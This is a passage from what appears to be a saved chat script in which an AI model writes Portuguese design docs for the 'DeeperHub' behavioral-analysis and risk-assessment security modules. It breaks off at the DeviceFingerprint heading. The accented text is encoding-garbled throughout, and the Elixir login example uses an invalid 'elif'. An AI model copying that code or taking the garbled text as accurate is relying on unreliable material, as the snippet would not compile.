### 6.4. `DeeperHub.Security.BehavioralAnalysis.update_user_profile(user_id :: String.t(), opts :: keyword()) :: {:ok, BehaviorProfile.t()} | {:error, term()}` (Nova Sugest√£o)

*   **Descri√ß√£o:** For√ßa a reconstru√ß√£o ou atualiza√ß√£o do perfil comportamental de um usu√°rio com base nos eventos armazenados.
*   **`opts`:**
    *   `:rebuild_from_scratch` (Boolean): Se `true`, descarta o perfil existente e reconstr√≥i.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :behavioral_analysis, :enabled]`** (Boolean): Habilita/desabilita o m√≥dulo. (Padr√£o: `true`)
*   **`[:security, :behavioral_analysis, :event_retention_days]`** (Integer): Por quantos dias manter eventos de comportamento brutos. (Padr√£o: `30`)
*   **`[:security, :behavioral_analysis, :profile_update_interval_hours]`** (Integer): Frequ√™ncia para atualiza√ß√£o autom√°tica de perfis. (Padr√£o: `24`)
*   **`[:security, :behavioral_analysis, :min_events_for_profile]`** (Integer): N√∫mero m√≠nimo de eventos necess√°rios para construir um perfil inicial confi√°vel. (Padr√£o: `100`)
*   **`[:security, :behavioral_analysis, :anomaly_thresholds]`** (Map): Limiares para diferentes tipos de anomalias (ex: `%{login_time_deviation_std: 3.0, new_device_score_penalty: 20}`).
*   **`[:security, :behavioral_analysis, :monitored_event_types]`** (List de Atoms): Lista de `event_type` que o sistema deve ativamente coletar e analisar.
*   **`[:security, :behavioral_analysis, :ml_model_path]`** (String, opcional): Caminho para um modelo de ML pr√©-treinado, se usado.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Repo`.
*   `DeeperHub.Security.LoginLocation`: Para dados de localiza√ß√£o.
*   `DeeperHub.Security.DeviceFingerprint`: Para dados de dispositivo.
*   `DeeperHub.Biometrics` (Opcional): Para dados de anomalias biom√©tricas.
*   `DeeperHub.Accounts`: Para informa√ß√µes b√°sicas do usu√°rio.

### 8.2. Bibliotecas Externas

*   Bibliotecas para an√°lise estat√≠stica (ex: `Statistics`).
*   Bibliotecas de Machine Learning (se ML for usado, ex: `Nx`, `Axon`).

## ü§ù 9. Como Usar / Integra√ß√£o

**Registro de Eventos:** M√≥dulos de dom√≠nio devem chamar `record_behavior_event/4` quando a√ß√µes relevantes do usu√°rio ocorrem.
```elixir
# Exemplo no controller de Profile
def update(conn, params) do
  # ... l√≥gica de atualiza√ß√£o ...
  DeeperHub.Security.BehavioralAnalysis.record_behavior_event(
    conn.assigns.current_user.id,
    :profile_field_updated,
    %{field: \"email\", old_value_hash: \"...\", new_value_hash: \"...\"}, # Hashear valores sens√≠veis
    %{ip_address: conn.remote_ip, user_agent: Plug.Conn.get_req_header(conn, \"user-agent\")}
  )
  # ...
end
```

**Consumindo An√°lises (Ex: pelo `RiskAssessment`):**
```elixir
def get_behavioral_risk_factor(user_id, current_context) do
  case DeeperHub.Security.BehavioralAnalysis.analyze_user_behavior(user_id, time_window_hours: 24) do
    {:ok, %{anomaly_score: score}} -> score # Normalizar para a escala de fatores de risco
    _ -> 0.0 # Risco neutro se an√°lise falhar ou n√£o houver dados
  end
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a constru√ß√£o de perfis com diferentes conjuntos de eventos.
*   Testar a detec√ß√£o de anomalias para cen√°rios conhecidos (ex: login de novo dispositivo deve gerar score X).
*   Testar a robustez dos algoritmos de `PatternAnalysisService` e `AnomalyDetectionService`.
*   Verificar se os workers de background (`ProfileBuilderWorker`, `BatchAnalysisWorker`) funcionam corretamente.
*   Localiza√ß√£o: `test/deeper_hub/security/behavioral_analysis/`.

### 10.2. M√©tricas

*   `deeper_hub.security.behavioral_analysis.events_recorded.count` (tags: `event_type`)
*   `deeper_hub.security.behavioral_analysis.profiles_built.count`
*   `deeper_hub.security.behavioral_analysis.anomalies_detected.count` (tags: `anomaly_type`, `user_segment`)
*   `deeper_hub.security.behavioral_analysis.anomaly_score.distribution` (Histograma)
*   `deeper_hub.security.behavioral_analysis.profile_update.duration_ms` (Histograma)
*   `deeper_hub.security.behavioral_analysis.realtime_analysis.duration_ms` (Histograma)

### 10.3. Logs

*   **N√≠vel INFO:** Constru√ß√£o/atualiza√ß√£o de perfil bem-sucedida, in√≠cio/fim de an√°lises em lote.
*   **N√≠vel WARNING:** Anomalias de risco m√©dio detectadas, falha ao construir perfil por falta de dados.
*   **N√≠vel ERROR:** Anomalias de alto risco detectadas, erros internos nos servi√ßos de an√°lise.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :behavioral_analysis, :event_processing, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, event_type: type}`
*   `[:deeper_hub, :security, :behavioral_analysis, :profile_build, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, event_count: count}`
*   `[:deeper_hub, :security, :behavioral_analysis, :anomaly_detection, :stop]`
    *   Metadados: `%{user_id: id, anomaly_score: score, anomalies: list_of_anomalies}`

## ‚ùå 11. Tratamento de Erros

*   Falhas na an√°lise de um evento espec√≠fico n√£o devem impedir o processamento de outros.
*   Se o sistema n√£o conseguir construir um perfil para um usu√°rio (ex: poucos dados), ele deve operar em um modo degradado (ex: confiando mais em regras est√°ticas) ou atribuir um score de risco neutro/padr√£o.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Privacidade dos Dados Comportamentais:** Os dados de comportamento do usu√°rio s√£o altamente sens√≠veis.
    *   Anonimizar ou pseudoanonimizar dados sempre que poss√≠vel.
    *   Aplicar criptografia em repouso para os perfis e eventos armazenados.
    *   Controle de acesso rigoroso aos dados e resultados da an√°lise.
    *   Pol√≠ticas claras de reten√ß√£o e exclus√£o de dados.
*   **Vi√©s nos Modelos:** Se modelos de ML forem usados, monitorar e mitigar vieses que possam discriminar injustamente certos grupos de usu√°rios.
*   **Ataques de Evas√£o:** Invasores podem tentar manipular seu comportamento para \"treinar\" um perfil falso ou evitar a detec√ß√£o. O sistema deve ter mecanismos para detectar tais tentativas.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Novas caracter√≠sticas comportamentais a serem monitoradas devem ser cuidadosamente avaliadas quanto ao seu valor para detec√ß√£o de risco e impacto na privacidade.
*   Algoritmos de detec√ß√£o de anomalias devem ser bem documentados e testados.
*   Priorizar a explicabilidade dos resultados da an√°lise.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar modelos de Machine Learning mais sofisticados para detec√ß√£o de anomalias e constru√ß√£o de perfis.
*   [ ] Adicionar \"feedback de usu√°rio\" sobre anomalias detectadas (ex: \"Sim, fui eu\" ou \"N√£o, isso n√£o fui eu\") para refinar os perfis.
*   [ ] Permitir que os usu√°rios visualizem (de forma agregada e segura) partes de seu perfil comportamental.
*   [ ] Desenvolver mecanismos para detectar e se adaptar a mudan√ßas graduais e leg√≠timas no comportamento do usu√°rio.
*   [ ] Integrar com mais fontes de eventos (ex: dados de uso de aplica√ß√µes mobile).
*   [ ] Oferecer diferentes \"n√≠veis de sensibilidade\" para a an√°lise comportamental, configur√°veis por tipo de usu√°rio ou contexto.

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

A an√°lise comportamental √© um campo fascinante e complexo!

Qual ser√° o pr√≥ximo m√≥dulo? Podemos continuar na √°rea de seguran√ßa com `DeeperHub.Security.RiskAssessment` (que consome os dados daqui) ou `DeeperHub.Security.DeviceFingerprint`, ou mudar para um m√≥dulo Core como `DeeperHub.Core.Repo`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos detalhar agora o `DeeperHub.Security.RiskAssessment`, que se conecta diretamente com o `BehavioralAnalysis` e outros m√≥dulos de seguran√ßa para fornecer uma vis√£o consolidada do risco.

---

# M√≥dulo: `DeeperHub.Security.RiskAssessment` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.RiskAssessment`

O m√≥dulo `DeeperHub.Security.RiskAssessment` √© o componente central do DeeperHub respons√°vel por **avaliar e quantificar o n√≠vel de risco associado a diversas opera√ß√µes e intera√ß√µes dentro do sistema**. Ele agrega informa√ß√µes de m√∫ltiplos fatores e fontes ‚Äì como comportamento do usu√°rio, dados do dispositivo, localiza√ß√£o geogr√°fica, natureza da opera√ß√£o, e alertas de outros sistemas de seguran√ßa (ex: `FraudDetection`, `IntrusionDetection`) ‚Äì para calcular uma pontua√ß√£o de risco compreensiva.

O objetivo principal √© permitir que o DeeperHub tome decis√µes de seguran√ßa adaptativas e contextuais. Com base na avalia√ß√£o de risco, o sistema pode, por exemplo, permitir uma opera√ß√£o, exigir etapas adicionais de verifica√ß√£o (como MFA), impor limita√ß√µes, ou at√© mesmo bloquear uma a√ß√£o considerada de alto risco. Este m√≥dulo √© crucial para uma postura de seguran√ßa proativa e din√¢mica. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Avalia√ß√£o de Risco Contextual:**
    *   Avaliar o risco de uma ampla gama de opera√ß√µes, incluindo:
        *   Tentativas de login (`assess_login_risk/3`).
        *   Altera√ß√µes de perfil sens√≠veis (`assess_profile_change_risk/3`).
        *   Transa√ß√µes financeiras ou de valor (`assess_transaction_risk/3`).
        *   Requisi√ß√µes de API (`assess_api_request_risk/3`).
        *   Validade e risco de sess√µes de usu√°rio (`assess_session_risk/3`).
        *   Outras a√ß√µes espec√≠ficas de dom√≠nio (`assess_action_risk/4`).
*   **Agrega√ß√£o de Fatores de Risco:**
    *   Coletar dados de diversos m√≥dulos e fontes para calcular fatores de risco individuais (ex: reputa√ß√£o do IP, novidade do dispositivo, anomalia comportamental, hist√≥rico de fraude).
    *   Utilizar `RiskFactorCalculator` e `AdvancedRiskFactors` para quantificar esses fatores.
*   **C√°lculo de Pontua√ß√£o de Risco:**
    *   Aplicar pesos configur√°veis a cada fator de risco.
    *   Calcular uma pontua√ß√£o de risco consolidada (ex: 0-100) usando o `RiskCalculatorService`.
    *   Mapear a pontua√ß√£o para n√≠veis de risco qualitativos (ex: `:low`, `:medium`, `:high`, `:critical`).
*   **Recomenda√ß√£o de A√ß√µes de Seguran√ßa:**
    *   Com base no n√≠vel de risco e no tipo de opera√ß√£o, sugerir a√ß√µes de mitiga√ß√£o apropriadas (ex: `:allow`, `:challenge_mfa`, `:limit_functionality`, `:block`, `:notify_security_team`) utilizando o `RiskActionRecommender`.
*   **Gerenciamento de Perfis de Risco de Usu√°rio:**
    *   Construir e manter um perfil de risco din√¢mico para cada usu√°rio, refletindo seu hist√≥rico de risco e comportamento.
    *   Atualizar o perfil com base em novas avalia√ß√µes.
*   **Pol√≠ticas de Risco Configur√°veis:**
    *   Permitir a defini√ß√£o e ajuste de pesos de fatores, limiares de n√≠vel de risco e regras para recomenda√ß√£o de a√ß√µes atrav√©s do `DeeperHub.Security.Policy.SecurityPolicyManager`.
*   **Hist√≥rico e Auditoria de Avalia√ß√µes:**
    *   Manter um registro de todas as avalia√ß√µes de risco realizadas, incluindo os fatores contribuintes e o resultado.
    *   Integrar com `DeeperHub.Audit` para auditoria.
*   **Calibra√ß√£o e Feedback (Opcional):**
    *   Permitir a calibra√ß√£o dos modelos de risco e pesos dos fatores com base em feedback manual (ex: an√°lise de falsos positivos/negativos) ou aprendizado autom√°tico.
*   **Observabilidade:**
    *   Fornecer m√©tricas detalhadas sobre as avalia√ß√µes de risco, distribui√ß√£o de scores e efic√°cia das pol√≠ticas.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.RiskAssessment` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as solicita√ß√µes de avalia√ß√£o de risco.
    *   Delega para o `DefaultRiskAssessmentService`.
2.  **`DeeperHub.Security.RiskAssessment.Services.DefaultRiskAssessmentService` (GenServer ou Servi√ßo Coordenador):**
    *   **Responsabilidade:** Orquestra todo o processo de avalia√ß√£o.
    *   **Intera√ß√µes:**
        *   Coleta dados de contexto (IP, dispositivo, sess√£o).
        *   Obt√©m dados do usu√°rio (de `DeeperHub.Accounts`) e seu perfil de risco (do `ProfileStore` interno ou de `DefaultRiskAssessmentService` mesmo).
        *   Chama `RiskFactorCalculator` para fatores de risco baseados em atributos.
        *   Chama `AdvancedRiskFactors` para fatores comportamentais e contextuais mais complexos (pode interagir com `BehavioralAnalysis`, `LoginLocation`).
        *   Envia os fatores e seus valores para `RiskCalculatorService`.
        *   Recebe o score e n√≠vel de risco.
        *   Chama `RiskActionRecommender` para obter a√ß√µes sugeridas.
        *   Registra a avalia√ß√£o (via `RiskAssessmentLogStore` ou similar).
        *   Atualiza o perfil de risco do usu√°rio.
3.  **`DeeperHub.Security.RiskAssessment.Services.RiskFactorCalculator`:**
    *   M√≥dulo funcional contendo fun√ß√µes para calcular valores de fatores de risco individuais (ex: `calculate_ip_risk(ip)`, `calculate_device_novelty_score(user_id, device_fingerprint)`).
4.  **`DeeperHub.Security.RiskAssessment.Services.AdvancedRiskFactors`:**
    *   M√≥dulo funcional ou GenServer para fatores que exigem mais estado ou an√°lise (ex: `calculate_impossible_travel_score`, `get_behavioral_anomaly_score`).
5.  **`DeeperHub.Security.RiskAssessment.Services.RiskCalculatorService`:**
    *   M√≥dulo funcional que aplica pesos (obtidos de `SecurityPolicyManager`) aos fatores de risco e calcula a pontua√ß√£o final.
    *   Determina o n√≠vel de risco com base em limiares configurados.
6.  **`DeeperHub.Security.RiskAssessment.Services.RiskActionRecommender`:**
    *   M√≥dulo funcional ou GenServer que, com base no n√≠vel de risco, tipo de opera√ß√£o e pol√≠ticas, sugere um conjunto de a√ß√µes (ex: `[:require_mfa, :notify_user]`).
7.  **`DeeperHub.Security.RiskAssessment.Services.RiskWeightCalibrator` (Opcional):**
    *   GenServer para gerenciar e potencialmente auto-ajustar os pesos dos fatores de risco.
8.  **`DeeperHub.Security.RiskAssessment.Metrics.RiskMetricsCollector` (GenServer):**
    *   Coleta e agrega m√©tricas sobre as avalia√ß√µes de risco.
9.  **Schemas (Persist√™ncia):**
    *   `DeeperHub.Security.RiskAssessment.Schemas.RiskProfile`: Para armazenar o perfil de risco de cada usu√°rio.
    *   `DeeperHub.Security.RiskAssessment.Schemas.RiskAssessmentLog`: Para armazenar o hist√≥rico de avalia√ß√µes de risco.
10. **Configura√ß√µes (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Define pesos, limiares, regras de a√ß√£o, etc.

### 3.2. Estrutura de Diret√≥rios (Consistente com a anterior)

```
lib/deeper_hub/security/risk_assessment/
‚îú‚îÄ‚îÄ risk_assessment.ex                # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îú‚îÄ‚îÄ default_risk_assessment_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ risk_factor_calculator.ex
‚îÇ   ‚îú‚îÄ‚îÄ advanced_risk_factors.ex
‚îÇ   ‚îú‚îÄ‚îÄ risk_calculator_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ risk_action_recommender.ex
‚îÇ   ‚îî‚îÄ‚îÄ risk_weight_calibrator.ex     # Opcional
‚îÇ
‚îú‚îÄ‚îÄ metrics/
‚îÇ   ‚îî‚îÄ‚îÄ risk_metrics_collector.ex
‚îÇ
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îú‚îÄ‚îÄ risk_profile.ex
‚îÇ   ‚îî‚îÄ‚îÄ risk_assessment_log.ex
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Baseado em Evid√™ncias:** A avalia√ß√£o de risco deve ser baseada em m√∫ltiplos pontos de dados e evid√™ncias, n√£o em um √∫nico fator.
*   **Pondera√ß√£o Configur√°vel:** A import√¢ncia de cada fator de risco deve ser configur√°vel para adaptar o sistema a diferentes cen√°rios e toler√¢ncias a risco.
*   **Explicabilidade:** O sistema deve ser capaz de fornecer (pelo menos para administradores) os fatores que contribu√≠ram para uma determinada pontua√ß√£o de risco.
*   **Ciclo de Feedback:** Mecanismos para ajustar o modelo de risco com base em resultados (fraudes reais, falsos positivos) s√£o importantes para a melhoria cont√≠nua.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Avalia√ß√£o de Risco de Login:**
    *   `DeeperHub.Auth` solicita uma avalia√ß√£o de risco para uma tentativa de login.
    *   `RiskAssessment` considera: IP (novo, reputa√ß√£o), dispositivo (novo, confi√°vel), localiza√ß√£o (usual, viagem imposs√≠vel), hor√°rio (usual), hist√≥rico de tentativas falhas, score de anomalia comportamental.
    *   Retorna um score e a√ß√µes (ex: permitir, exigir MFA).
*   **Avalia√ß√£o de Risco de Mudan√ßa de Senha:**
    *   `DeeperHub.Accounts` solicita avalia√ß√£o antes de permitir a mudan√ßa de senha.
    *   `RiskAssessment` considera: sess√£o atual (MFA verificado recentemente?), IP/dispositivo da solicita√ß√£o, se a senha antiga foi fornecida corretamente.
    *   Pode recomendar notifica√ß√£o ao usu√°rio em todos os casos, e MFA se o risco for m√©dio/alto.
*   **Avalia√ß√£o de Risco de uma Transa√ß√£o de Alto Valor (Exemplo):**
    *   Um m√≥dulo financeiro solicita avalia√ß√£o.
    *   `RiskAssessment` considera: valor da transa√ß√£o (vs. hist√≥rico), destinat√°rio (novo, conhecido), frequ√™ncia de transa√ß√µes, score de anomalia comportamental do usu√°rio.
    *   Pode recomendar bloqueio tempor√°rio e revis√£o manual.

## üåä 5. Fluxos Importantes

### Fluxo de Avalia√ß√£o de Risco Gen√©rico (`assess_risk/4`)

1.  **Solicita√ß√£o:** Um m√≥dulo chama `DeeperHub.Security.RiskAssessment.assess_risk(user_id, operation_type, operation_data, context_data)`.
2.  **`DefaultRiskAssessmentService`:**
    *   **Coleta de Dados:**
        *   Obt√©m perfil de risco do `user_id` (se existir).
        *   Obt√©m dados de `LoginLocation`, `DeviceFingerprint`, `BehavioralAnalysis` relacionados ao `user_id` e `context_data`.
    *   **C√°lculo de Fatores:**
        *   Chama `RiskFactorCalculator` para calcular fatores b√°sicos (ex: `ip_is_known`, `device_is_trusted`).
        *   Chama `AdvancedRiskFactors` para calcular fatores complexos (ex: `behavioral_score`, `geo_velocity_score`).
    *   **C√°lculo de Score:**
        *   Envia a lista de `{fator, valor}` para `RiskCalculatorService`.
        *   `RiskCalculatorService` obt√©m os pesos dos fatores (de `SecurityPolicyManager`) e calcula a pontua√ß√£o de risco agregada e o n√≠vel de risco.
    *   **Recomenda√ß√£o de A√ß√£o:**
        *   Envia o `operation_type` e `risk_level` para `RiskActionRecommender`.
        *   `RiskActionRecommender` consulta as pol√≠ticas (de `SecurityPolicyManager`) e retorna uma lista de a√ß√µes (ex: `[:allow, :log_medium_risk]`).
    *   **Registro e Atualiza√ß√£o:**
        *   Registra a avalia√ß√£o completa (fatores, score, a√ß√µes) no `RiskAssessmentLog`.
        *   (Opcional) Enfileira uma atualiza√ß√£o para o `RiskProfile` do usu√°rio.
    *   **Resposta:** Retorna o `RiskAssessmentResult.t()` para o chamador.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

*(Baseado no que j√° foi documentado e consolidado)*

### 6.1. `DeeperHub.Security.RiskAssessment.assess_risk(user_id :: String.t() | nil, operation_type :: atom(), operation_data :: map(), context_data :: map(), opts :: keyword()) :: {:ok, RiskAssessmentResult.t()} | {:error, term()}`

*   **Descri√ß√£o:** Avalia o risco de uma opera√ß√£o, considerando o usu√°rio, tipo de opera√ß√£o, dados espec√≠ficos da opera√ß√£o e contexto.
*   **`operation_type`:** Ex: `:login`, `:password_change`, `:email_update`, `:api_access_resource_x`, `:financial_transaction`.
*   **`operation_data`:** Mapa com dados relevantes para a `operation_type` (ex: para `:financial_transaction`, `%{amount: 100.0, currency: \"USD\", recipient_account: \"...\"}`).
*   **`context_data`:** Mapa com dados contextuais (ex: `%{ip_address: \"1.2.3.4\", user_agent: \"...\", session_id: \"...\", device_fingerprint: \"...\"}`).
*   **`opts`:** Op√ß√µes adicionais, como `:force_recalculation` (ignorar cache de perfil de risco).
*   **`RiskAssessmentResult.t()`:** `%{risk_score: float(), risk_level: atom(), recommended_actions: list(atom()), contributing_factors: list(%{factor: atom(), value: term(), score_impact: float()}), assessment_id: String.t()}`.

### 6.2. `DeeperHub.Security.RiskAssessment.get_user_risk_profile(user_id :: String.t(), opts :: keyword()) :: {:ok, UserRiskProfile.t()} | {:error, :not_found | term()}`

*   **Descri√ß√£o:** Obt√©m o perfil de risco atual de um usu√°rio.
*   **`UserRiskProfile.t()`:** Mapa contendo dados como `%{average_login_risk: float(), last_high_risk_event_at: DateTime.t() | nil, typical_locations: list(map()), known_devices: list(String.t()), behavioral_baseline_summary: map()}`.

### 6.3. `DeeperHub.Security.RiskAssessment.get_assessment_details(assessment_id :: String.t()) :: {:ok, RiskAssessmentLog.t()} | {:error, :not_found | term()}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Recupera os detalhes completos de uma avalia√ß√£o de risco espec√≠fica pelo seu ID.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :risk_assessment, :enabled]`** (Boolean): Habilita/desabilita o m√≥dulo.
*   **`[:security, :risk_assessment, :default_weights, <factor_name>]`** (Float): Peso padr√£o para cada fator de risco.
    *   Ex: `[:security, :risk_assessment, :default_weights, :ip_reputation_score] = 0.15`
*   **`[:security, :risk_assessment, :risk_level_thresholds]`** (Map): Mapeamento de scores para n√≠veis.
    *   Ex: `%{critical: 90, high: 70, medium: 40, low: 20}` (scores acima do valor s√£o o n√≠vel).
*   **`[:security, :risk_assessment, :action_policies]`** (List de Maps): Regras para mapear `operation_type` e `risk_level` para `recommended_actions`.
    *   Ex: `%{operation_type: :login, risk_level: :high, actions: [:challenge_mfa, :notify_user]}`
*   **`[:security, :risk_assessment, :profile_history_days]`** (Integer): Quantos dias de dados usar para construir/atualizar perfis de risco.
*   **`[:security, :risk_assessment, :log_retention_days]`** (Integer): Reten√ß√£o para logs de avalia√ß√£o de risco.
*   **`[:security, :risk_assessment, :factors_enabled, <factor_name>]`** (Boolean): Habilita/desabilita fatores de risco espec√≠ficos.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.Repo`.
*   `DeeperHub.Security.Policy.SecurityPolicyManager`: Essencial para obter pesos, limiares e regras de a√ß√£o.
*   `DeeperHub.Security.LoginLocation`, `DeeperHub.Security.DeviceFingerprint`, `DeeperHub.Security.BehavioralAnalysis`: Fornecedores chave de fatores de risco.
*   `DeeperHub.Security.FraudDetection`: Pode ser tanto um consumidor dos resultados do RiskAssessment quanto um provedor de um fator de risco (\"fraude detectada anteriormente\").
*   `DeeperHub.Accounts`: Para dados de usu√°rio.
*   `DeeperHub.MFA`: Para executar a√ß√µes como `:require_mfa`.
*   `DeeperHub.Audit`: Para logar as avalia√ß√µes.

### 8.2. Bibliotecas Externas

*   Nenhuma depend√™ncia externa direta crucial para o orquestrador, mas os m√≥dulos de c√°lculo de fatores (`AdvancedRiskFactors`) podem usar bibliotecas de ML/estat√≠stica.

## ü§ù 9. Como Usar / Integra√ß√£o

O `RiskAssessment` √© tipicamente chamado por outros m√≥dulos de seguran√ßa ou de dom√≠nio antes de permitir opera√ß√µes sens√≠veis.

**Exemplo em `DeeperHub.Auth` durante o login:**
```elixir
# Dentro do fluxo de login, ap√≥s a verifica√ß√£o prim√°ria da senha
context_data = %{ip_address: ip, device_fingerprint: fp, user_agent: ua}
case DeeperHub.Security.RiskAssessment.assess_risk(user.id, :login, %{}, context_data) do
  {:ok, %{recommended_actions: actions}} ->
    if :block in actions do
      {:error, :login_blocked_high_risk}
    elif :challenge_mfa in actions and UserMFASettings.is_enabled?(user.id) do
      {:error, :mfa_required_due_to_risk} # Sinaliza para o frontend iniciar fluxo MFA
    else
      # Prosseguir com a cria√ß√£o da sess√£o
      # ...
    end
  {:error, _reason} ->
    # Falha segura: talvez negar ou exigir MFA se o risk assessment falhar
    Logger.error(\"Falha na avalia√ß√£o de risco do login para user_id: #{user.id}\")
    {:error, :mfa_required_risk_assessment_failed} 
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a orquestra√ß√£o do `DefaultRiskAssessmentService` com mocks para os calculadores de fatores e recomendador de a√ß√µes.
*   Testar cada servi√ßo (`RiskFactorCalculator`, `AdvancedRiskFactors`, `RiskCalculatorService`, `RiskActionRecommender`) individualmente com diversos cen√°rios de entrada.
*   Testar a l√≥gica de persist√™ncia e recupera√ß√£o de `RiskProfile` e `RiskAssessmentLog`.
*   Localiza√ß√£o: `test/deeper_hub/security/risk_assessment/`.

### 10.2. M√©tricas

*   `deeper_hub.security.risk_assessment.evaluations.count` (tags: `operation_type`, `resulting_risk_level`)
*   `deeper_hub.security.risk_assessment.evaluation.duration_ms` (Histograma, tags: `operation_type`)
*   `deeper_hub.security.risk_assessment.factor_calculation.duration_ms` (Histograma, tags: `factor_name`)
*   `deeper_hub.security.risk_assessment.actions_taken.count` (tags: `operation_type`, `action_taken`, `original_risk_level`)
*   `deeper_hub.security.risk_assessment.profiles.updated.count` (Contador)

### 10.3. Logs

*   **N√≠vel DEBUG:** Valores detalhados de cada fator de risco calculado durante uma avalia√ß√£o.
*   **N√≠vel INFO:** Resultado de cada avalia√ß√£o de risco (score, n√≠vel, a√ß√µes recomendadas, ID da avalia√ß√£o).
*   **N√≠vel WARNING:** Avalia√ß√µes resultando em risco alto ou cr√≠tico, ou quando uma opera√ß√£o √© bloqueada devido ao risco.
*   **N√≠vel ERROR:** Falhas no processo de avalia√ß√£o, incapacidade de calcular fatores essenciais.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :risk_assessment, :assess_operation, :start | :stop | :exception]`
    *   Metadados: `%{operation_type: type, user_id: id, context_keys: keys(context_data)}`
    *   No `:stop`: `%{risk_score: score, risk_level: level, recommended_actions: actions, assessment_id: id}`
*   `[:deeper_hub, :security, :risk_assessment, :factor_calculated]`
    *   Metadados: `%{assessment_id: id, factor_name: name, factor_value: value, score_contribution: contrib}`
*   `[:deeper_hub, :security, :risk_assessment, :action_recommended]`
    *   Metadados: `%{assessment_id: id, operation_type: type, risk_level: level, actions: actions}`

## ‚ùå 11. Tratamento de Erros

*   Se um fator de risco espec√≠fico n√£o puder ser calculado (ex: servi√ßo de geolocaliza√ß√£o offline), o sistema deve usar um valor padr√£o ou um peso neutro para esse fator, logar o problema e continuar a avalia√ß√£o com os fatores dispon√≠veis.
*   Uma falha completa no `RiskAssessmentService` deve ser tratada como um cen√°rio de alto risco pelo chamador, aplicando a pol√≠tica de seguran√ßa mais restritiva (ex: negar a opera√ß√£o).

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Integridade dos Dados de Entrada:** O `RiskAssessment` confia nos dados fornecidos por outros m√≥dulos (IP, dispositivo, comportamento). A seguran√ßa desses m√≥dulos √© indiretamente crucial.
*   **Seguran√ßa das Pol√≠ticas de Risco:** As configura√ß√µes de pesos, limiares e regras de a√ß√£o s√£o cr√≠ticas e devem ser protegidas contra acesso n√£o autorizado (responsabilidade do `SecurityPolicyManager`).
*   **Manipula√ß√£o de Perfil:** Um invasor n√£o deve ser capaz de manipular seu perfil de risco para parecer de baixo risco. A atualiza√ß√£o dos perfis deve ser um processo controlado.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   A adi√ß√£o de novos fatores de risco deve ser acompanhada de uma an√°lise de seu impacto potencial e da disponibilidade/confiabilidade dos dados necess√°rios.
*   As regras de recomenda√ß√£o de a√ß√£o devem ser claras e cobrir todos os n√≠veis de risco e tipos de opera√ß√£o relevantes.
*   Mantenha a l√≥gica de c√°lculo de fatores e de pontua√ß√£o o mais transparente e test√°vel poss√≠vel.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar aprendizado de m√°quina para otimizar dinamicamente os pesos dos fatores de risco e identificar novos padr√µes de risco.
*   [ ] Adicionar capacidade de simula√ß√£o (\"what-if\") para testar o impacto de mudan√ßas nas pol√≠ticas de risco em dados hist√≥ricos.
*   [ ] Desenvolver uma UI para visualiza√ß√£o de perfis de risco, hist√≥rico de avalia√ß√µes e ajuste manual de pesos/limiares por administradores.
*   [ ] Permitir a defini√ß√£o de \"contextos de risco\" personalizados (ex: \"per√≠odo de alta promo√ß√£o\", \"novo lan√ßamento de feature\") que podem influenciar temporariamente os pesos ou limiares.
*   [ ] Integra√ß√£o com Threat Intelligence Feeds para enriquecer fatores de risco como reputa√ß√£o de IP.

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

O `RiskAssessment` √© um m√≥dulo integrador bem interessante!

Qual o pr√≥ximo? Talvez `DeeperHub.Security.DeviceFingerprint` e `DeeperHub.Security.GeoLocationService`, que s√£o importantes provedores de fatores de risco? Ou prefere algo do Core, como `DeeperHub.Core.Cache`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos seguir com `DeeperHub.Security.DeviceFingerprint` e, em seguida, podemos abordar `DeeperHub.Security.GeoLocationService`, pois ambos s√£o fontes importantes de informa√ß√£o para o `RiskAssessment`.

---

# M√≥dulo: `DeeperHub.Security.DeviceFingerprint` üöÄ

